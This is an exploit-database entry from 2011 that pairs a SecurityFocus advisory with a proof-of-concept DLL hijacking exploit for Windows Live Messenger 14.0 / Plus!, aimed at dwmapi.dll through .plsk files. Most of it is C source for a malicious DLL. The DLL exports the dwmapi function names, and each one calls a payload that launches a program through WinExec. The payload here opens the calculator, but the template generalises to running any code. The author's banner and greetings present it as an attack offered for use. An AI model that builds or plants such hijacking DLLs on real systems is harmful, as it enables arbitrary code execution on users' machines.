source: http://www.securityfocus.com/bid/48055/info

Microsoft Windows Live Messenger is prone to a vulnerability that lets attackers execute arbitrary code.

An attacker can exploit this issue by enticing a legitimate user to use the vulnerable application to open a file from a network share location that contains a specially crafted Dynamic Linked Library (DLL) file. 

1-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=0
0     _                   __           __       __                     1
1   /' \            __  /'__`\        /\ \__  /'__`\                   0
0  /\_, \    ___   /\_\/\_\ \ \    ___\ \ ,_\/\ \/\ \  _ ___           1
1  \/_/\ \ /' _ `\ \/\ \/_/_\_<_  /'___\ \ \/\ \ \ \ \/\`'__\          0
0     \ \ \/\ \/\ \ \ \ \/\ \ \ \/\ \__/\ \ \_\ \ \_\ \ \ \/           1
1      \ \_\ \_\ \_\_\ \ \ \____/\ \____\\ \__\\ \____/\ \_\           0
0       \/_/\/_/\/_/\ \_\ \/___/  \/____/ \/__/ \/___/  \/_/           1
1                  \ \____/ >> Exploit database separated by exploit   0
0                   \/___/          type (local, remote, DoS, etc.)    1
1                                                                      1
0  [+] Site            : 1337day.com                                  0
1  [+] Support e-mail  : submit[at]1337day.com                        1
0                                                                      0
1               #########################################              1
0               I'm kalashinkov3 member from Inj3ct0r Team              1
1               #########################################              0
0-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-==-=-=-1

#########################################################
# Title : Msn Live Messenger14.0=>Plus! DLL Hijacking Exploit (dwmapi.dll)
# Author: Kalashinkov3
# Home : 13000/ ALGERIA
# Email : kalashinkov3[at]Hotmail[dot]Fr
# Date : 31/05/2011
# Category  : Local Exploit
# Tested on: [Windows Xp Sp3 Fr]       
#########################################################  

# File Vulnerable: 
- msnmsgr.exe


# Vulnerable extensions:

- .plsk

" Vulnerable Dll's:

dwmapi.dll 

./

#include <windows.h>
#define DLLIMPORT _declspec (dllexport)
                                                                                                                                                                                   
DLLIMPORT void DwmDefWindowProc() { evil(); }                                                                                                                                                                               
DLLIMPORT void DwmEnableBlurBehindWindow() { evil(); }                                                                                                                                                                      
DLLIMPORT void DwmEnableComposition() { evil(); }                                                                                                                                                                           
DLLIMPORT void DwmEnableMMCSS() { evil(); }                                                                                                                                                                                 
DLLIMPORT void DwmExtendFrameIntoClientArea() { evil(); }                                                                                                                                                                   
DLLIMPORT void DwmGetColorizationColor() { evil(); }                                                                                                                                                                        
DLLIMPORT void DwmGetCompositionTimingInfo() { evil(); }                                                                                                                                                                    
DLLIMPORT void DwmGetWindowAttribute() { evil(); }                                                                                                                                                                          
DLLIMPORT void DwmIsCompositionEnabled() { evil(); }                                                                                                                                                                        
DLLIMPORT void DwmModifyPreviousDxFrameDuration() { evil(); }                                                                                                                                                               
DLLIMPORT void DwmQueryThumbnailSourceSize() { evil(); }                                                                                                                                                                    
DLLIMPORT void DwmRegisterThumbnail() { evil(); }                                                                                                                                                                           
DLLIMPORT void DwmSetDxFrameDuration() { evil(); }                                                                                                                                                                          
DLLIMPORT void DwmSetPresentParameters() { evil(); }                                                                                                                                                                        
DLLIMPORT void DwmSetWindowAttribute() { evil(); }                                                                                                                                                                          
DLLIMPORT void DwmUnregisterThumbnail() { evil(); }                                                                                                                                                                         
DLLIMPORT void DwmUpdateThumbnailProperties() { evil(); }

int evil()
{
  WinExec("calc", 0);
  exit(0);
  return 0;
}


^_^ GOOD LUCK ALL :) 

+ Greets To==================================================================+
                                                                             + 
BrOx-dz, KedAns-Dz, Caddy-Dz, KnocKout, toxic-kim, [Lila Far=>D], Keinji1258 +
ALLA Foundou,586, 1337day.com, packetstormsecurity.org, Exploit-id.com       +
andhrahackers.com, all Algerians Hacker'S ;) & 1337day.com/team              +
                    # All My Friends #                                       +
=============================================================================+